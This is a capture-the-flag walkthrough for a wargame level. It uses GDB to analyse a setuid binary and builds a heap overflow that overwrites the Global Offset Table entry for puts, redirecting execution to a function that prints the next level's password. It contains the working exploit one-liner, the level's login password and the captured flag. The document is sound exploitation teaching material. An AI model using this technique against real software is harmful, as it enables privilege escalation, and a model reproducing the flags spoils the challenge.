# Level 7

## Requirements

- None

## Walkthrough

1. Login

    ```bash
    > ssh -p 4242 level7@192.168.1.66
    Password: f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d

    GCC stack protector support:            Enabled
      Strict user copy checks:                Disabled
      Restrict /dev/mem access:               Enabled
      Restrict /dev/kmem access:              Enabled
      grsecurity / PaX: No GRKERNSEC
      Kernel Heap Hardening: No KERNHEAP
     System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level7/level7
    ```

2. Check file

    ```bash
    > ls -l
    total 8
    -rwsr-s---+ 1 level8 users 5648 Mar  9  2016 level7

    > ./level7
    Segmentation fault (core dumped)

    > level7@RainFall:~$ ./level7 qwe
    Segmentation fault (core dumped)

    > level7@RainFall:~$ ./level7 qwe qwe
    ~~
    ```

3. Analyse using GDB

    ```bash
    > gdb level7
    ...

    > (gdb) info functions
    All defined functions:

    Non-debugging symbols:
    0x0804836c  _init
    0x080483b0  printf
    0x080483b0  printf@plt
    0x080483c0  fgets
    0x080483c0  fgets@plt
    0x080483d0  time
    0x080483d0  time@plt
    0x080483e0  strcpy
    0x080483e0  strcpy@plt
    0x080483f0  malloc
    0x080483f0  malloc@plt
    0x08048400  puts
    0x08048400  puts@plt
    0x08048410  __gmon_start__
    0x08048410  __gmon_start__@plt
    0x08048420  __libc_start_main
    0x08048420  __libc_start_main@plt
    0x08048430  fopen
    0x08048430  fopen@plt
    0x08048440  _start
    0x08048470  __do_global_dtors_aux
    0x080484d0  frame_dummy
    0x080484f4  m
    0x08048521  main
    0x08048610  __libc_csu_init
    0x08048680  __libc_csu_fini
    0x08048682  __i686.get_pc_thunk.bx
    0x08048690  __do_global_ctors_aux
    0x080486bc  _fini

    > (gdb) info variables
    All defined variables:

    Non-debugging symbols:
    0x080486d8  _fp_hw
    0x080486dc  _IO_stdin_used
    0x08048824  __FRAME_END__
    0x08049828  __CTOR_LIST__
    0x08049828  __init_array_end
    0x08049828  __init_array_start
    0x0804982c  __CTOR_END__
    0x08049830  __DTOR_LIST__
    0x08049834  __DTOR_END__
    0x08049838  __JCR_END__
    0x08049838  __JCR_LIST__
    0x0804983c  _DYNAMIC
    0x08049908  _GLOBAL_OFFSET_TABLE_
    0x08049938  __data_start
    0x08049938  data_start
    0x0804993c  __dso_handle
    0x08049940  completed.6159
    0x08049944  dtor_idx.6161
    0x08049960  c
    ```

4. We have 2 functions `main` and `m`, and also a variable `c`.

    ```bash
    > (gdb) disas main
    Dump of assembler code for function main:
       0x08048521 <+0>:	push   %ebp
       0x08048522 <+1>:	mov    %esp,%ebp
       0x08048524 <+3>:	and    $0xfffffff0,%esp
       0x08048527 <+6>:	sub    $0x20,%esp
       0x0804852a <+9>:	movl   $0x8,(%esp)
       0x08048531 <+16>:	call   0x80483f0 <malloc@plt>
       0x08048536 <+21>:	mov    %eax,0x1c(%esp)
       0x0804853a <+25>:	mov    0x1c(%esp),%eax
       0x0804853e <+29>:	movl   $0x1,(%eax)
       0x08048544 <+35>:	movl   $0x8,(%esp)
       0x0804854b <+42>:	call   0x80483f0 <malloc@plt>
       0x08048550 <+47>:	mov    %eax,%edx
       0x08048552 <+49>:	mov    0x1c(%esp),%eax
       0x08048556 <+53>:	mov    %edx,0x4(%eax)
       0x08048559 <+56>:	movl   $0x8,(%esp)
       0x08048560 <+63>:	call   0x80483f0 <malloc@plt>
       0x08048565 <+68>:	mov    %eax,0x18(%esp)
       0x08048569 <+72>:	mov    0x18(%esp),%eax
       0x0804856d <+76>:	movl   $0x2,(%eax)
       0x08048573 <+82>:	movl   $0x8,(%esp)
       0x0804857a <+89>:	call   0x80483f0 <malloc@plt>
       0x0804857f <+94>:	mov    %eax,%edx
       0x08048581 <+96>:	mov    0x18(%esp),%eax
       0x08048585 <+100>:	mov    %edx,0x4(%eax)
       0x08048588 <+103>:	mov    0xc(%ebp),%eax
       0x0804858b <+106>:	add    $0x4,%eax
       0x0804858e <+109>:	mov    (%eax),%eax
       0x08048590 <+111>:	mov    %eax,%edx
       0x08048592 <+113>:	mov    0x1c(%esp),%eax
       0x08048596 <+117>:	mov    0x4(%eax),%eax
       0x08048599 <+120>:	mov    %edx,0x4(%esp)
       0x0804859d <+124>:	mov    %eax,(%esp)
       0x080485a0 <+127>:	call   0x80483e0 <strcpy@plt>
       0x080485a5 <+132>:	mov    0xc(%ebp),%eax
       0x080485a8 <+135>:	add    $0x8,%eax
       0x080485ab <+138>:	mov    (%eax),%eax
       0x080485ad <+140>:	mov    %eax,%edx
       0x080485af <+142>:	mov    0x18(%esp),%eax
       0x080485b3 <+146>:	mov    0x4(%eax),%eax
       0x080485b6 <+149>:	mov    %edx,0x4(%esp)
       0x080485ba <+153>:	mov    %eax,(%esp)
       0x080485bd <+156>:	call   0x80483e0 <strcpy@plt>
       0x080485c2 <+161>:	mov    $0x80486e9,%edx
       0x080485c7 <+166>:	mov    $0x80486eb,%eax
       0x080485cc <+171>:	mov    %edx,0x4(%esp)
       0x080485d0 <+175>:	mov    %eax,(%esp)
       0x080485d3 <+178>:	call   0x8048430 <fopen@plt>
       0x080485d8 <+183>:	mov    %eax,0x8(%esp)
       0x080485dc <+187>:	movl   $0x44,0x4(%esp)
       0x080485e4 <+195>:	movl   $0x8049960,(%esp)
       0x080485eb <+202>:	call   0x80483c0 <fgets@plt>
       0x080485f0 <+207>:	movl   $0x8048703,(%esp)
       0x080485f7 <+214>:	call   0x8048400 <puts@plt>
       0x080485fc <+219>:	mov    $0x0,%eax
       0x08048601 <+224>:	leave
       0x08048602 <+225>:	ret
    End of assembler dump.

    > (gdb) disas m
    Dump of assembler code for function m:
       0x080484f4 <+0>:	push   %ebp
       0x080484f5 <+1>:	mov    %esp,%ebp
       0x080484f7 <+3>:	sub    $0x18,%esp
       0x080484fa <+6>:	movl   $0x0,(%esp)
       0x08048501 <+13>:	call   0x80483d0 <time@plt>
       0x08048506 <+18>:	mov    $0x80486e0,%edx
       0x0804850b <+23>:	mov    %eax,0x8(%esp)
       0x0804850f <+27>:	movl   $0x8049960,0x4(%esp)
       0x08048517 <+35>:	mov    %edx,(%esp)
       0x0804851a <+38>:	call   0x80483b0 <printf@plt>
       0x0804851f <+43>:	leave
       0x08048520 <+44>:	ret
    End of assembler dump.
    ```

5. Pseudo-code using IDA.

    ```c
    char c[80];

    int m()
    {
      int timestamp; // eax

      timestamp = time(0);
      return printf("%s - %d\n", c, timestamp);
    }

    int main(int argc, const char **argv, const char **envp)
    {
      int fd; // eax
      _DWORD *arg_2; // [esp+18h] [ebp-8h]
      _DWORD *arg_1; // [esp+1Ch] [ebp-4h]

      arg_1 = (_DWORD *)malloc(8);
      *arg_1 = 1;
      arg_1[1] = malloc(8);

      arg_2 = (_DWORD *)malloc(8);
      *arg_2 = 2;
      arg_2[1] = malloc(8);

      strcpy(arg_1[1], argv[1]);
      strcpy(arg_2[1], argv[2]);

      fd = fopen("/home/user/level8/.pass", "r");
      fgets(c, 68, fd);

      puts("~~");
      return 0;
    }
    ```

6. We have some standard functions here, let’s check the documentation first.

    ```c
    fopen - opens the file whose name is the string pointed to by pathname and associates a stream with it.
    fgets - read bytes from stream into the array pointed to by s until n-1 bytes are read, or a <newline> is read and transferred to s, or an end-of-file condition is encountered.
    puts - writes the string s and a trailing newline to stdout.
    ```

7. Well, I guess we have to exploit those `strcpy` since they are unsafe to overflow (unlike `strncpy`). Futhermore, both of them are called with `malloc`ed variables, therefore, we might only be able to overwrite content on the `heap`.
However, since both variables are `malloc`ed one after another, they should be next to each other, so we might be to overwrite the second one.

    ```c
    > (gdb) b *0x080485bd
    Breakpoint 1 at 0x80485bd
    > (gdb) b *0x080485a0
    Breakpoint 2 at 0x80485a0

    > (gdb) r "AAAA" "BBBB"
    Starting program: /home/user/level7/level7 "AAAA" "BBBB"

    Breakpoint 2, 0x080485a0 in main ()

    > (gdb) i r
    eax            0x804a018	134520856
    ecx            0x20fc1	135105
    edx            0xbffff900	-1073743616
    ebx            0xb7fd0ff4	-1208152076
    esp            0xbffff700	0xbffff700
    ebp            0xbffff728	0xbffff728
    esi            0x0	0
    edi            0x0	0
    eip            0x80485a0	0x80485a0 <main+127>
    eflags         0x200282	[ SF IF ID ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51

    > (gdb) step
    Single stepping until exit from function main,
    which has no line number information.

    Breakpoint 1, 0x080485bd in main ()

    > (gdb) i r
    eax            0x804a038	134520888
    ecx            0xbffff900	-1073743616
    edx            0xbffff905	-1073743611
    ebx            0xb7fd0ff4	-1208152076
    esp            0xbffff700	0xbffff700
    ebp            0xbffff728	0xbffff728
    esi            0x0	0
    edi            0x0	0
    eip            0x80485bd	0x80485bd <main+156>
    eflags         0x210286	[ PF SF IF RF ID ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51
    ```

8. Yeah, our intuition was right. The first argument `arg_1[1]` is stored at `0x804a018` and the second `arg_2[1]` is at `0x804a038` so we should be able to overwrite the second one with an overflow on the first one.

    ```c
    > (gdb) b *0x080485bd
    Breakpoint 1 at 0x80485bd
    > (gdb) b *0x080485a0
    Breakpoint 2 at 0x80485a0

    > (gdb) r "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ" "1111"
    Starting program: /home/user/level7/level7 "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQ" "1111"

    Breakpoint 2, 0x080485a0 in main ()

    > (gdb) i r
    eax            0x804a018	134520856
    ecx            0x20fc1	135105
    edx            0xbffff8c0	-1073743680
    ebx            0xb7fd0ff4	-1208152076
    esp            0xbffff6c0	0xbffff6c0
    ebp            0xbffff6e8	0xbffff6e8
    esi            0x0	0
    edi            0x0	0
    eip            0x80485a0	0x80485a0 <main+127>
    eflags         0x200286	[ PF SF IF ID ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51

    > (gdb) step
    Single stepping until exit from function main,
    which has no line number information.

    Breakpoint 1, 0x080485bd in main ()

    > (gdb) i r
    eax            0x46464646	1179010630
    ecx            0xbffff900	-1073743616
    edx            0xbffff905	-1073743611
    ebx            0xb7fd0ff4	-1208152076
    esp            0xbffff6c0	0xbffff6c0
    ebp            0xbffff6e8	0xbffff6e8
    esi            0x0	0
    edi            0x0	0
    eip            0x80485bd	0x80485bd <main+156>
    eflags         0x210282	[ SF IF RF ID ]
    cs             0x73	115
    ss             0x7b	123
    ds             0x7b	123
    es             0x7b	123
    fs             0x0	0
    gs             0x33	51
    ```

9. Perfect, we got it. So, since `0x46464646 = FFFF` we have a padding of `20` bytes.

    ```bash
    > python -c "print len('AAAABBBBCCCCDDDDEEEE')"
    20
    ```

10. After some research, we found out that we could overwrite a dynamicly resolved function address on the Global Offset Table, so to try this hypothesis, we have to find where is stored the function address we want to overwrite.
Thus, since our goal for now is to find a way to call `m` to print out our flag, the function we will want to overwrite will be `puts` (`fopen` open the flag file, `fgets` reads the flag, so `puts` if the only one left).

    ```bash
    > (gdb) disas puts
    Dump of assembler code for function puts@plt:
       0x08048400 <+0>:	jmp    *0x8049928
       0x08048406 <+6>:	push   $0x28
       0x0804840b <+11>:	jmp    0x80483a0
    End of assembler dump.
    ```

11. Ok, so the `puts` function address is stored at `0x08049928`, consequently, we want to append it to the previous padding, hence, we can overwrite it using the second `strcpy`.
Moreover, we want to call `m` instead of `puts`, and thankfully to the initial GDB informations, we already know that `m` is at `0x080484f4`.

    ```bash
    arg_1 = $(python -c "print 'A'*20 + '\x28\x99\x04\x08'")
    arg_2 = $(python -c "print '\xf4\x84\x04\x08'")
    ```

12. Capture the flag!

    ```bash
    > ./level7 $(python -c "print 'A'*20 + '\x28\x99\x04\x08'") $(python -c "print '\xf4\x84\x04\x08'")
    5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
     - 1732123058
    ```


## Documentation

- Function: [fopen](https://man7.org/linux/man-pages/man3/fopen.3.html)
- Function: [fgets](https://man7.org/linux/man-pages/man3/fgets.3p.html)
- Function: [puts](https://man7.org/linux/man-pages/man3/puts.3.html)
- Article: [CTF - Global Offset Table](https://cs4401.walls.ninja/notes/lecture/basics_global_offset_table.html)
- Article: [Exploit - Global Offset Table](https://medium.com/@0xwan/binary-exploitation-heap-overflow-to-overwrite-got-d3c7d97716f1)
